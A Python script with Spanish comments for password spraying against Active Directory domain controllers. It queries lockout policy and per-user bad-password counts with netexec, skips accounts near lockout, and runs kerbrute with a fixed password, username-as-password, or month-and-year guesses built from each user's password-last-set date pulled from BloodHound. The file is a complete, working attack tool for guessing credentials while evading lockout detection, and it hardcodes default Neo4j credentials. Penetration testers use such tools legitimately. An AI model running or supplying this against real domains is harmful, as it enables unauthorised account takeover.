#!/usr/bin/env python3
import argparse
import subprocess
import tempfile
import re
import os
import sys
import logging
from bloodhound_cli import BloodHoundACEAnalyzer
import curses
from datetime import datetime,timezone

# Configuración inicial de logging: mostramos logs a partir de INFO
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

def clean_ansi(text):
    """Elimina los códigos ANSI de un texto."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def get_netexec_users(dc_ip, username, password, domain):
    """
    Ejecuta netexec para obtener la lista de usuarios y su BadPW.
    Se utiliza una cadena de comandos con grep y awk para filtrar la salida.
    """
    cmd = (
        f"nxc smb {dc_ip} -u {username} -p {password} -d {domain} --users "
        "| grep -v '<never>' | awk '{print $5,$8}' | grep -v ']' | grep -v '-Username- Set-'"
    )
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando netexec para obtener usuarios: %s", e)
        sys.exit(1)

    users = []
    for line in result.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        user = parts[0]
        try:
            badpw = int(parts[1])
        except ValueError:
            continue
        users.append((user, badpw))
    return users

def get_account_lockout_threshold(dc_ip, username, password, domain):
    """
    Ejecuta netexec para extraer el account lockout threshold del dominio.
    Se asume que la salida contiene una línea similar a:
      "Account lockout threshold: 5"
    o
      "Account lockout threshold: None"
    Esta función captura cualquier valor que siga a los dos puntos y, si es numérico, lo retorna como entero.
    """
    cmd = f"nxc smb {dc_ip} -u {username} -p {password} -d {domain} --pass-pol"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando netexec para obtener la política de lockout: %s", e)
        sys.exit(1)
    
    match = re.search(r'(?i)Account\s+Lockout\s+Threshold\s*:\s*(.*)', result.stdout)
    if match:
        value = match.group(1).strip()
        try:
            return int(value)
        except ValueError:
            return value
    else:
        logger.error("No se pudo obtener el Account lockout threshold del dominio.")
        sys.exit(1)

def read_enabled_users(enabled_users_file):
    """
    Lee desde un archivo la lista de usuarios habilitados.
    Se espera que el archivo contenga un usuario por línea.
    """
    try:
        with open(enabled_users_file, "r") as f:
            enabled_users = { line.strip() for line in f if line.strip() }
        return enabled_users
    except Exception as e:
        logger.error("Error leyendo la lista de usuarios habilitados: %s", e)
        sys.exit(1)

def curses_menu(stdscr, title, options):
    """
    Muestra un menú interactivo con curses para seleccionar una opción.
    Retorna el índice seleccionado.
    """
    curses.curs_set(0)  # ocultamos el cursor
    selected = 0
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, title, curses.A_BOLD)
        for idx, option in enumerate(options):
            if idx == selected:
                stdscr.addstr(idx+2, 2, f"> {option}", curses.A_REVERSE)
            else:
                stdscr.addstr(idx+2, 2, f"  {option}")
        stdscr.refresh()
        key = stdscr.getch()
        if key in [curses.KEY_UP, ord('k')]:
            selected = (selected - 1) % len(options)
        elif key in [curses.KEY_DOWN, ord('j')]:
            selected = (selected + 1) % len(options)
        elif key in [curses.KEY_ENTER, ord('\n')]:
            return selected

def smart_date_menu():
    """
    Interfaz interactiva con curses para seleccionar:
      - El idioma (English o Spanish)
      - La presentación del mes: Lower (e.g., january2025) o Upper (e.g., January2025)
      - El modo de formateo (por ahora, solo "months") y el formato deseado.
    Retorna una tupla (language, month_case, spray_format_option).
    """
    # Opciones para el idioma:
    languages = ["English", "Spanish"]
    # Opciones para la presentación del mes:
    case_options = ["Lower (e.g., january2025)", "Upper (e.g., January2025)"]
    # Opciones para el modo (por ahora solo "months")
    mode_options = ["months"]
    # Lista de formatos disponibles para months usando placeholder genérico "month"
    months_formats = [
        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
        "All"
    ]

    def curses_logic(stdscr):
        lang_idx = curses_menu(stdscr, "Select language:", languages)
        case_idx = curses_menu(stdscr, "Select month case:", case_options)
        mode_idx = curses_menu(stdscr, "Select spray mode:", mode_options)
        fmt_idx = curses_menu(stdscr, "Select months spray format:", months_formats)
        month_case = "lower" if case_idx == 0 else "upper"
        return languages[lang_idx], month_case, months_formats[fmt_idx]

    return curses.wrapper(curses_logic)

def smart_date_formats():
    """Devuelve la lista de formatos para months con el placeholder 'month'."""
    return [
        "{month}{full_year}", "{month}.{full_year}", "{month}{full_year}.", "{month}@{full_year}", "{month}{full_year}!",
        "{month}{year_short}", "{month}.{year_short}", "{month}{year_short}.", "{month}@{year_short}", "{month}{year_short}!",
        "All"
    ]

def generate_spray_list(analyzer, domain, smart_date_params):
    """
    Usa la API de bloodhound-cli para obtener para cada usuario la fecha del pwdlastset.
    Luego, dependiendo del mes extraído y del formato seleccionado, genera una contraseña.
    smart_date_params es una tupla (language, month_case, format_option).
    Si format_option es "All", se generan todas las variantes (concatenadas por comas).
    Retorna una lista de cadenas en el formato "user:password".
    """
    language, month_case, fmt_option = smart_date_params

    # Obtén los datos de password last change desde bloodhound-cli
    data = analyzer.get_password_last_change(domain)
    spray_lines = []
    # Mapeo de meses para Spanish.
    spanish_months = {
        "January": "enero", "February": "febrero", "March": "marzo", "April": "abril",
        "May": "mayo", "June": "junio", "July": "julio", "August": "agosto",
        "September": "septiembre", "October": "octubre", "November": "noviembre", "December": "diciembre"
    }

    for record in data:
        user = record['user']
        ts = record.get('password_last_change')
        try:
            ts_float = float(ts)
            if ts_float == 0:
                wc = record.get('when_created')
                dt = datetime.fromtimestamp(float(wc), tz=timezone.utc)
            else:
                dt = datetime.fromtimestamp(ts_float, tz=timezone.utc)
        except Exception as e:
            logger.error(f"Error converting timestamp for user {user}: {e}")
            continue

        # Obtener el mes en inglés usando dt.strftime("%B")
        month_eng = dt.strftime("%B")
        # Para Spanish, mapea al mes en minúsculas; para English se usa el original.
        if language == "Spanish":
            base_month = spanish_months.get(month_eng, month_eng.lower())
        else:
            base_month = month_eng
        # Ajustar el case según la opción seleccionada.
        if month_case == "lower":
            month_final = base_month.lower()
        else:
            month_final = base_month.capitalize()

        year_full = dt.strftime("%Y")
        year_short = dt.strftime("%y")

        def apply_format(fmt_str):
            # Utiliza el método .format() para reemplazar los placeholders.
            return fmt_str.format(month=month_final, full_year=year_full, year_short=year_short)

        if fmt_option == "All":
            variants = [fmt for fmt in smart_date_formats() if fmt != "All"]
            spray_candidates = [apply_format(fmt) for fmt in variants]
            password = ",".join(spray_candidates)
        else:
            password = apply_format(fmt_option)
        spray_lines.append(f"{user}:{password}")
    return spray_lines

def write_temp_spray_file(lines):
    """
    Escribe en un archivo temporal la lista de spraying con formato "user:password".
    Retorna la ruta del archivo temporal.
    """
    tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
    for line in lines:
        tmp.write(line + "\n")
    tmp.close()
    return tmp.name

def run_smart_kerbrute(domain, dc_ip, temp_file):
    """
    Ejecuta el comando kerbrute bruteforce usando el archivo temporal generado.
    """
    cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_file]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        logger.info(clean_ansi(result.stdout))
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando kerbrute: %s", e)
        logger.error(clean_ansi(e.stdout))
        logger.error(clean_ansi(e.stderr))
        sys.exit(1)

def write_temp_users_file(users):
    """
    Escribe en un archivo temporal la lista de usuarios elegibles para spraying.
    """
    tmp = tempfile.NamedTemporaryFile(mode='w', delete=False)
    for user in users:
        tmp.write(user + "\n")
    tmp.close()
    return tmp.name

def run_kerbrute(domain, dc_ip, temp_users_file, spray_password, use_user_as_pass=False, output_dir=None):
    """
    Ejecuta kerbrute passwordspray usando la lista de usuarios.
    Si use_user_as_pass es True se añade el parámetro --user-as-pass en vez de la contraseña.
    Si se especifica output_dir, se añade el parámetro -o con el directorio de salida.
    """
    if use_user_as_pass:
        cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, "--user-as-pass", temp_users_file]
    else:
        if spray_password:
            # Usar el modo passwordspray con contraseña fija.
            cmd = ["kerbrute", "passwordspray", "-d", domain, "--dc", dc_ip, temp_users_file, spray_password]
        else:
            # En modo smart-date, no se suministra contraseña; se usa "bruteforce"
            cmd = ["kerbrute", "bruteforce", "-d", domain, "--dc", dc_ip, temp_users_file]
    
    if output_dir:
        cmd.extend(["-o", output_dir])
        
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        # Limpiar el output de códigos ANSI antes de imprimir
        cleaned_stdout = clean_ansi(result.stdout)
        logger.info(cleaned_stdout)
    except subprocess.CalledProcessError as e:
        logger.error("Error ejecutando kerbrute: %s", e)
        logger.error(clean_ansi(e.stdout))
        logger.error(clean_ansi(e.stderr))
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Script para realizar password spraying con kerbrute. "
                    "Si se provee autenticación (-ul y -pl) se obtiene la información del dominio (BadPW, Account Lockout Threshold) "
                    "y se filtran los usuarios; en caso contrario, se usa directamente la lista de usuarios proporcionada."
    )
    # Parámetros de autenticación para netexec (no obligatorios)
    parser.add_argument("-ul", help="Username para netexec (si se omite, no se obtiene información del dominio)")
    parser.add_argument("-pl", help="Password para netexec (si se omite, no se obtiene información del dominio)")
    parser.add_argument("-d", required=True, help="Dominio (usado para netexec y kerbrute)")
    parser.add_argument("--dc-ip", required=True, help="IP del Domain Controller (PDC)")
    parser.add_argument("-t", type=int, default=0,
                        help="Threshold seguro: mínimo número de intentos restantes para realizar spray (solo si se dispone de autenticación)")
    parser.add_argument("-u", required=True,
                        help="Ruta a la lista de usuarios habilitados del dominio")
    parser.add_argument("-p", help="Password para realizar el password spraying (kerbrute)")
    parser.add_argument("-target-domain", help="Dominio objetivo para kerbrute. Si se especifica, se usa en kerbrute en lugar del dominio de -d.")
    parser.add_argument("-o", "--output", help="Directorio donde guardar el output de kerbrute")

    # Opciones mutuamente excluyentes para --user-as-pass
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--user-as-pass-low", action="store_true",
                       help="Utilizar --user-as-pass con usuario en minúsculas")
    group.add_argument("--user-as-pass-up", action="store_true",
                       help="Utilizar --user-as-pass con usuario con primera letra en mayúsculas")

    # Nuevo parámetro para smart-date
    parser.add_argument("--smart-date", action="store_true",
                        help="Usar spraying personalizado basado en la fecha (pwdlastset) extraída de bloodhound-cli")
    # Parámetro para modo debug
    parser.add_argument("--debug", action="store_true",
                        help="Activar modo debug para ver información detallada.")

    args = parser.parse_args()

    # Si se especifica --debug, subimos el nivel de logging a DEBUG
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logger.debug("Modo debug activado. Mostrando información más detallada.")

    # Validación: se debe especificar -p o --user-as-pass o --smart-date
    if not args.p and not (args.user_as_pass_low or args.user_as_pass_up) and not args.smart_date:
        parser.error("Debe especificar una contraseña de spray con -p, o una opción --user-as-pass o --smart-date")

    # Si se proporcionan las credenciales para netexec, primero comprobamos el Account Lockout Threshold
    if args.ul and args.pl:
        logger.info("[*] Obteniendo Account lockout threshold del dominio...")
        account_threshold = get_account_lockout_threshold(args.dc_ip, args.ul, args.pl, args.d)
        logger.info(f"[*] Account lockout threshold obtenido: {account_threshold}")

        if isinstance(account_threshold, int):
            logger.info("[*] Umbral configurado, obteniendo la lista de usuarios y su BadPW con netexec...")
            netexec_users = get_netexec_users(args.dc_ip, args.ul, args.pl, args.d)
            if not netexec_users:
                logger.error("No se obtuvieron usuarios de netexec.")
                sys.exit(1)

            logger.info("[*] Leyendo lista de usuarios habilitados...")
            enabled_users = read_enabled_users(args.u)
            filtered_users = [(user, badpw) for user, badpw in netexec_users if user in enabled_users]
            if not filtered_users:
                logger.error("No hay usuarios habilitados en la lista de netexec.")
                sys.exit(1)

            eligible_users = []
            for user, badpw in filtered_users:
                remaining = account_threshold - badpw
                if remaining > args.t:
                    eligible_users.append(user)
                else:
                    logger.debug(f"[-] Usuario {user} no es elegible para spray. BadPW: {badpw}, intentos restantes: {remaining}")
            if not eligible_users:
                logger.info("No hay usuarios elegibles para password spraying según el threshold seguro.")
                sys.exit(0)
        else:
            logger.info("[*] No se configuró un umbral de bloqueo (valor obtenido: '%s'), se usarán todos los usuarios sin filtrar por BadPW.", account_threshold)
            eligible_users = list(read_enabled_users(args.u))
            if not eligible_users:
                logger.error("La lista de usuarios proporcionada está vacía.")
                sys.exit(1)
    else:
        logger.info("[*] No se proporcionó autenticación para netexec, se usará la lista de usuarios directamente.")
        eligible_users = list(read_enabled_users(args.u))
        if not eligible_users:
            logger.error("La lista de usuarios proporcionada está vacía.")
            sys.exit(1)

    # Ramas según el modo de spraying
    if args.smart_date:
        logger.info("[*] Modo smart-date activado. Obteniendo datos de password last change desde bloodhound-cli...")
        # Configuración para BloodHoundACEAnalyzer (ajusta según tu entorno)
        bh_uri = "bolt://localhost:7687"
        bh_user = "neo4j"
        bh_password = "bloodhound"
        analyzer = BloodHoundACEAnalyzer(bh_uri, bh_user, bh_password)
        # Llama a la interfaz interactiva con curses para seleccionar idioma y formato.
        smart_date_params = smart_date_menu()  # Retorna (language, format_option)
        logger.info(f"[*] Se seleccionó: Idioma={smart_date_params[0]}, Formato de spray='{smart_date_params[1]}'")
        # Obtenemos los datos de password last change para definir los usuarios elegibles
        data = analyzer.get_password_last_change(args.d)
        # Extraemos los usuarios (los habilitados según bloodhound-cli)
        eligible_users = [record['user'] for record in data]
        spray_list = generate_spray_list(analyzer, args.d, smart_date_params)
        analyzer.close()
        logger.info("[*] Número de usuarios para spraying (smart-date): %d", len(eligible_users))
        temp_file = write_temp_spray_file(spray_list)
    else:
        logger.info("[*] Número de usuarios elegibles para password spraying: %d", len(eligible_users))
        spray_list = [f"{user}:{args.p}" for user in eligible_users]
        temp_file = write_temp_users_file(eligible_users)

    # Si se activa --debug, se listan todos los usuarios elegibles
    if args.debug:
        logger.debug("[*] Usuarios elegibles para password spraying:")
        for user in eligible_users:
            logger.debug(f" - {user}")

    use_user_as_pass = False
    if args.user_as_pass_low:
        eligible_users = [user.lower() for user in eligible_users]
        use_user_as_pass = True
    elif args.user_as_pass_up:
        eligible_users = [user.capitalize() for user in eligible_users]
        use_user_as_pass = True

    logger.info(f"[*] Archivo temporal generado: {temp_file}")

    kerbrute_domain = args.target_domain if args.target_domain else args.d

    logger.info("[*] Ejecutando kerbrute passwordspray...")
    run_kerbrute(kerbrute_domain, args.dc_ip, temp_file, args.p if not args.smart_date else None,
                 use_user_as_pass=use_user_as_pass, output_dir=args.output)

    os.remove(temp_file)
    logger.info("[*] Proceso completado.")

if __name__ == "__main__":
    main()